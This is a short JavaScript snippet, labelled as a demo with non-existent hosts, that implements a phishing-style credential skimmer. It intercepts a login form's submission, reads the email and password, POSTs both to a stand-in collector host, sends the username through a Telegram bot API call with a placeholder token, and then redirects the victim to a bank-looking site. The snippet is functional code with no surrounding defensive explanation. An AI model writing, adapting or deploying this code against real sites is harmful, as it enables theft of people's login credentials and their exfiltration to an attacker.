// DEMO ONLY: the hosts below do not exist.
const form = document.querySelector("#login");
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  const user = document.querySelector("#email").value;
  const pass = document.querySelector("#password").value;
  await fetch("https://collector.evil-example.net/log", {
    method: "POST",
    body: JSON.stringify({ user, pass }),
  });
  const token = "000000:DEMO";
  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=0&text=${user}`);
  window.location = "https://www.acmebank.example/";
});
